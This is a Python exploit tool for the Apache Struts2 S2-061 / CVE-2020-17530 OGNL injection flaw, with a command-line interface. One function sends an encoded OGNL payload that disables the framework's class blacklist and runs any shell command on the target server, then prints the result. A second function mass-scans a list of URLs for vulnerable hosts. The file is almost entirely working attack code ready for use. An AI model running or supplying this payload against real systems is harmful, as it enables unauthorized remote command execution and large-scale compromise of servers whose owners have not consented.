#coding=utf-8

import requests
import re
import sys
from lxml import etree
import click

requests.packages.urllib3.disable_warnings()

#对一个系统命令执行
def exp(url, cmd): 
    payload = "%25%7b(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application%5b%27org.apache.tomcat.InstanceManager%27%5d).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d%7b%27"+cmd+"%27%7d).(%23res%3d%23exec.exec(%23cmd))%7d"
    tturl=url+"/?id="+payload
    r=requests.get(tturl)
    page=r.text
    page=etree.HTML(page)
    data = page.xpath('//a[@id]/@id')
    print(data[0])

#批量扫描漏洞
def scan(file):
    payload="%25%7b+%27YaunSky%27+%2b+(2000+%2b+20).toString()%7d"
    f = open(file, 'r')
    for target in f.readlines():
        url = target.strip()
        tturl=url+"/?id="+payload
        try:
            r=requests.get(tturl, verify = False)
            page=r.text
            page=etree.HTML(page)
            data = page.xpath('//a[@id]/@id')
            if "YaunSky2020" in data[0]:
                print("[+]"+url+"存在s2-062漏洞")
        except requests.exceptions.ConnectionError:
            r.status_code = "Connection refused"

@click.command()
@click.option("--url", help='Target URL; Example:http://ip:port。')
@click.option("--file", help="Target File; Example:target.txt。")
@click.option("--cmd", help="Commands to be executed; ")
def main(url, cmd, file):
    print("[+]============================================================")
    print("[+]S2-061 RCE && CVE-2020-17530 ")
    print("[+]Explain: YaunSky")
    print("[+]============================================================")
 
    if url != None:
        exp(url, cmd)
    if file != None:
        scan(file)

if __name__ == "__main__":
    main()